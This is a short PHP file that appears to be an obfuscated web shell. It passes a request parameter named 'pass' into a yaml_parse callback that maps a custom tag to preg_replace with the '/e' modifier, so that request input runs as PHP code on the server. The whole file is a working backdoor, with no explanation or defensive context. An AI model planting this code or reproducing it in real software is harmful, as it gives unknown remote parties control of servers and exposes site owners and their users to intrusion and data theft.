<?php
$str = urlencode($_REQUEST['pass']);
$yaml = <<<EOD
greeting: !{$str} "|.+|e"
EOD;
$parsed = yaml_parse($yaml, 0, $cnt, array("!{$_REQUEST['pass']}" => 'preg_replace'));
?>